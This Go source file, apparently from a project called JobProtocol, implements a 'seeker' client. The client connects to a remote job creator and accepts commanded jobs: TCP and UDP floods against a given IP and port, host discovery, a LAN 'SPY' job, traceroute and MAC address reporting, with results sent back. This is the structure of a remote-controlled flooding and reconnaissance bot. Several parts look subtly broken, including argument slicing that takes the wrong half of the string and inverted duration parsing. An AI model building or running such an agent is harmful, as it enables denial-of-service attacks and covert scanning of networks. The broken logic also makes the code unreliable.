package seeker

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"net"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/Knetic/govaluate"

	globals "github.com/prairir/JobProtocol/Globals"
	jobs "github.com/prairir/JobProtocol/Jobs"
)

// Seeker is a connection loop to any creator, handling jobs. Calling with main in a loop.
func Seeker() {
	// set timeout and connection
	fmt.Println("waiting for job creator...")
	var conn net.Conn
	for {
		temp, err := net.Dial(globals.ConnType, fmt.Sprint(globals.ConnAddr, ":", globals.ConnPort))
		if err == nil {
			conn = temp
			break
		}
	}
	defer conn.Close()
	fmt.Println("Found job creator!")

	// state
	// 0 initial connection
	// 1 received HELLOACK, waiting for JOB
	// 2 accepted first JOB EQN and waiting for second JOB EQN
	// 3 done job
	state := 0
	// send HELLO at initial connection
	fmt.Fprintln(conn, "HELLO")
	fmt.Println("sent HELLO")
	for {
		fmt.Println("waiting for creator...")
		result, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			fmt.Println("Could not read connection. Connection is probably down. Start over. ")
			break
		}
		cleanedResult := strings.TrimSpace(string(result))
		fmt.Println("received:", cleanedResult, "state:", state)

		queryStr, err := globals.GetHeader(cleanedResult)
		if err != nil {
			conn.Write([]byte(fmt.Sprint("DENY JOB\r\n")))
			fmt.Println("denying job due to error", err)
			state = 1
			continue
		}
		fmt.Println("q:", queryStr)

		if state == 0 {
			if cleanedResult == "HELLOACK" {
				state = 1
			}
			continue
		} else if state == 1 {
			switch queryStr {
			case "JOB EQN":
				fallthrough
			case "JOB TCPFLOOD":
				fallthrough
			case "JOB HOSTUP":
				fallthrough
			case "JOB GETMAC":
				fallthrough
			case "JOB SPY":
				fallthrough
			case "JOB TRACERT":
				fallthrough
			case "JOB UDPFLOOD":
				conn.Write([]byte(fmt.Sprint("ACPT JOB ", queryStr[4:], " \r\n")))
				fmt.Println("accept:", result)
				break
			default:
				conn.Write([]byte("DENY JOB"))
				continue
			}
			state = 2
			continue
		} else if state == 2 {
			var data string
			if len(cleanedResult) > len(queryStr)+1 {
				data = cleanedResult[len(queryStr)+1:]
			} else {
				data = ""
			}
			fmt.Println("[", data, "]")
			switch queryStr {
			case "JOB EQN":
				expression, err := govaluate.NewEvaluableExpression(data)
				if err != nil {
					fmt.Println("job failed... bad input?", err.Error())
					conn.Write([]byte("JOB FAIL\r\n"))
					state = 2
					break
				}
				expResult, err := expression.Evaluate(nil)
				if err != nil {
					fmt.Println("job failed... bad input?", err.Error())
					conn.Write([]byte("JOB FAIL\r\n"))
				} else {
					fmt.Println("successful job! Result:", expResult)
					conn.Write([]byte("JOB SUCC " + fmt.Sprint(expResult) + "\r\n"))
				}
				break
			case "JOB TCPFLOOD":
				// splits after JOB TCPFLOOD
				// eg JOBTCPFLOOD 123.321.543.345 14 -> ["123.321.543.345", "14"]
				splits := strings.Split(cleanedResult[:13], " ")
				port, _ := strconv.Atoi(splits[1])

				jobs.TCPFlood(splits[0], port)

				conn.Write([]byte("JOB SUCC \r\n"))
				break
			case "JOB HOSTUP":
				hosts := strings.Split(cleanedResult[11:], " ")
				fmt.Println(hosts)
				var buf bytes.Buffer
				for _, host := range hosts {
					online, offline, err := jobs.HostUp(host, &buf)
					if err != nil {
						if err.Error() != "timeout" {
							conn.Write([]byte("JOB FAIL\r\n"))
							break
						}
					}
					fmt.Println("buffer: ", buf)
					conn.Write([]byte("JOB SUCC ONLINE "))
					for _, ip := range online {
						conn.Write([]byte(fmt.Sprint(ip, ", ")))
					}
					conn.Write([]byte("OFFLINE "))
					for _, ip := range offline {
						conn.Write([]byte(fmt.Sprint(ip, ", ")))
					}
					conn.Write([]byte("\r\n"))
					break
				}
				break
			case "JOB SPY":
				var m map[string]interface{}
				err := json.Unmarshal([]byte(data), &m)
				if err != nil {
					fmt.Println("ERROR: json parsing")
					fmt.Println("data:", data)
					conn.Write([]byte("JOB FAIL\r\n"))
					break
				}
				var dur int
				if m["duration"] != nil {
					var ok bool
					dur, ok = m["duration"].(int)
					if !ok {
						panic(m["duration"])
					} else {
						dur = 5
					}
					m["duration"] = nil
				}
				sameLAN, report := jobs.Neighbours(m, time.Duration(dur)*time.Second)
				conn.Write([]byte(fmt.Sprintln(sameLAN, "---", report)))
				break
			case "JOB UDPFLOOD":
				// splits after JOB UDPFLOOD
				// eg JOB UDPFLOOD 123.321.543.345 14 -> ["123.321.543.345", "14"]
				splits := strings.Split(cleanedResult[:13], " ")
				port, _ := strconv.Atoi(splits[1])

				jobs.UDPFlood(splits[0], port)

				conn.Write([]byte("JOB SUCC \r\n"))
				break
			case "JOB TRACERT":
				data2 := strings.Split(data, " ")
				if len(data2) > 1 {
					ips := jobs.Traceroute(data2[0], data2[1])
					conn.Write([]byte("JOB SUCC " + fmt.Sprint(ips) + "\r\n"))
				} else {
					if runtime.GOOS == "windows" {
						fmt.Println(data2)
						ips := jobs.Traceroute("Wi-Fi", data2[0])
						conn.Write([]byte("JOB SUCC " + fmt.Sprint(ips) + "\r\n"))
					} else {
						ips := jobs.Traceroute("eth0", data2[0])
						conn.Write([]byte("JOB SUCC " + fmt.Sprint(ips) + "\r\n"))
					}
				}
				break
			case "JOB GETMAC":
				fmt.Println("Data: [", data, "]")
				if data == "SPYSEEKER" {
					state = 0
					continue
				}
				res, err := jobs.GetMACstr()
				if err != nil {
					fmt.Println(err)
					conn.Write([]byte("JOB FAIL\r\n"))
					break
				}
				buf, err := json.Marshal(res)
				if err != nil {
					fmt.Println(err)
					conn.Write([]byte("JOB FAIL\r\n"))
					break
				}
				conn.Write([]byte(fmt.Sprintln("JOB SUCC", string(buf))))
				break
			case "JOB SPYSEEKER":
				state = 0
				continue
			default:
				conn.Write([]byte("JOB FAIL\r\n"))
				state = 0
				continue
			}
			state = 1
			continue
		}
	}
}

// Cmd is run in the cmd folders main.go
func Cmd() {
	i := 0
	re := ""
	for {
		fmt.Print(re, "starting seeker loop. Press Ctrl+C to exit. \n")
		Seeker()
		if i == 0 {
			re = "re"
			i++
		}
	}
}
